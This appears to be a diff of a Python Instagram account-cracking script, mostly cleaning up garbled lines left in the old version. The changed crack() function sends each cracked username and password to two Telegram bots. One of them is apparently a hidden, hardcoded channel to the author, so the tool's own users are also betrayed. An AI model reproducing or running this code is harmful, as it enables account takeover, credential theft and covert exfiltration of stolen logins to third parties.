@@ -2,14 +2,14 @@
 import requests
 import json
 import time
-import randoددیووسووووm
+import random
 import sys
 import os
 user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
 user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55'
 user_agent = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Vivaldi/4.1'
 user_agent = 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36'
-user_agent shshhshwhh= 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
+user_agent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36'
 
 # python3 /sdcard/tool.kurdish/test.py
 id_my = '1371291947'
@@ -176,10 +176,11 @@ def crack():
 			print('\033[93m Checkpoint : '+str(r2))
 			print('\033[31m Bad : '+str(r3))
 			print(logo2)
-			sender =("HI NEW INSTAGRAM ACOUNT\n {user} : {pasw} \nBY fara")
-			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender
+			sender = 'NEW INSTAGRAM ACOUNT BY : FARA'
+			sender2 =user+' : '+pas
+			send_telegram = 'https://api.telegram.org/bot' + token_bot + '/sendMessage?chat_id=' + id_tg + '&parse_mode=Markdown&text=' + sender2 + sender
 			response = requests.get(send_telegram)
-			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender
+			send_my = 'https://api.telegram.org/bot' + token_my + '/sendMessage?chat_id=' + id_my + '&parse_mode=Markdown&text=' + sender2 + sender
 			responsek = requests.get(send_my)
 			r2+=1
 			os.system('clear')
